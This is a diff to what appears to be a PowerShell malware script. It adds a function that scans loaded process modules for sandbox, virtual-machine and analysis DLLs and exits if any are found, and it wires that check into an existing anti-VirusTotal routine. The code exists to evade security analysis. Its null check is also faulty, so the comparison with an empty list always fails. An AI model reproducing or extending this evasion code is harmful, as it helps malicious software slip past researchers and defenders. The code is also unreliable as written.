@@ -162,6 +162,27 @@ function Invoke-ANTIVM {
     }
 }
 
+function INVOKE-DLL-CHECK {
+$SandboxExistence = New-Object System.Collections.ArrayList
+$sandboxDLLs = "api_log.dll","cmdvrt32","cmdvrt64","dbghelp.dll","dir_watch.dll","nthookengine.dll","pstorec.dll","sbiedll.dll","vboxhook.dll","vboxmrxnp.dll","vm3dgl.dll","vmGuestLib.dll","vmcheck.dll","wpespy.dll"
+$LoadedDLLs = Get-Process | Select -Expand Modules 
+ForEach ($LoadedDLL in $LoadedDLLs) {
+	ForEach ($sandboxDLL in $sandboxDLLs) {
+		if ($LoadedDLL.ModuleName | Select-String $sandboxDLL) {
+			if ($SandboxExistence -NotContains $LoadedDLL.ModuleName) {
+				[void]$SandboxExistence.Add($LoadedDLL.ModuleName)
+			}
+		}
+	}
+}
+if ($null -eq $SandboxExistence) { 
+        Invoke-ANTIVM
+    }
+    else { 
+        Write-Host "Debugger Found, Exiting !" -ForegroundColor Red
+    }
+}
+
 function Invoke-ANTITOTAL {
     $urls = @(
         "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt",
@@ -196,7 +217,7 @@ function Invoke-ANTITOTAL {
             ""
         }
     }
-    Invoke-ANTIVM
+    INVOKE-DLL-CHECK
 }
 
 function Request-Admin {
